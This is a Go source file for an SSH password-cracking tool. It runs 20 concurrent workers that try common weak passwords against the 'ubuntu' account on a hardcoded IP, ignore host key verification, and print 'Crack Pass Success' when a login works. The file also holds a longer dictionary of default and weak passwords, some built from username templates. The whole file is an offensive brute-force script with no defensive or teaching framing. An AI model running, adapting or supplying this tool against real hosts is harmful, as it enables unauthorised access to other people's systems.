package main

import (
	"fmt"
	"golang.org/x/crypto/ssh"
	"log"
	"strings"
	"sync"
	"time"
)


//var chanPass = make(chan string, 10)
var results = make(chan string, 10)
var done = make(chan bool)


var Passwords = []string{"123456", "admin", "admin123", "root", "", "pass123", "pass@123", "password", "654321", "123", "1", "admin@123", "Admin@123", "admin123!@#", "{user}", "{user}1", "{user}111", "{user}123", "{user}@123", "{user}_123", "{user}#123", "{user}@111", "{user}@2019", "P@ssw0rd!", "P@ssw0rd", "Passw0rd", "qwe123", "12345678", "test", "test123", "123qwe!@#", "123456789", "123321", "666666", "a123456.", "123456~a", "000000", "1234567890", "8888888", "!QAZ2wsx", "1qaz2wsx", "abc123", "abc123456", "1qaz@WSX", "a11111", "a12345", "Aa1234", "Aa1234.", "Aa12345", "a123456", "a123123", "123456a", "Aa123456", "Aa12345.", "sysadmin", "system", "huawei"}

var PA = []string{"123456", "admin", "admin123", "root", "pass123"}

func ubuntu(pass string)(result string){
	config := &ssh.ClientConfig{
		Timeout: time.Second, //ssh 连接time out 时间一秒钟, 如果ssh验证错误 会在一秒内返回
		User:    "ubuntu",
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(), //这个可以， 但是不够安全
		//HostKeyCallback: hostKeyCallBackFunc(h.Host),
	}
	log.Printf("Checking: %s", pass)
	conn, err := ssh.Dial("tcp", fmt.Sprintf("11.1.1.1:22"), config)
	if err == nil {
		defer conn.Close()
		session, err := conn.NewSession()
		errRet := session.Run("echo Hello")
		if err == nil && errRet == nil {
			defer session.Close()
			return pass

		}
	}
	return ""
}

//func createWorkerPool(numOfWorkers int) {
//	var wg sync.WaitGroup
//	for i := 0; i < numOfWorkers; i++ {
//		wg.Add(1)
//		go consumer(&wg)
//	}
//	wg.Wait()
//	close(results)
//}

func consumer(chanPass chan string, wg *sync.WaitGroup){
	defer wg.Done()
	for pass := range chanPass {
		results <-ubuntu(pass)
	}
}

func getResult(done chan bool){
	for r := range results {
		if r != "" {
			fmt.Printf(strings.Repeat("+", 20)+"\n")
			fmt.Printf("Crack Pass Success:%s\n", r)
			fmt.Printf(strings.Repeat("+", 20)+"\n")
			done <- true
		}
	}
	done <- true
	close(done)
}


func main() {

	//for i:=0; i< 3;i++ {
	//	fmt.Println(i)
		var chanPass = make(chan string, 10)
		startTime := time.Now()
		numberWork := 20


		go getResult(done)
		//go createWorkerPool(numberWork)

		go func() {
			var wg sync.WaitGroup
			for i := 0; i < numberWork; i++ {
				wg.Add(1)
				go consumer(chanPass, &wg)
			}
			wg.Wait()
			close(results)
		}()

	for _, k := range PA {
		fmt.Printf("-->Put Pass into Channel: %v\n", k)
		chanPass <- k
	}


		close(chanPass)

		<-done
		endTime := time.Now()
		diff := endTime.Sub(startTime)
		fmt.Println("total time taken ", diff.Seconds(), "seconds")
	}
//}
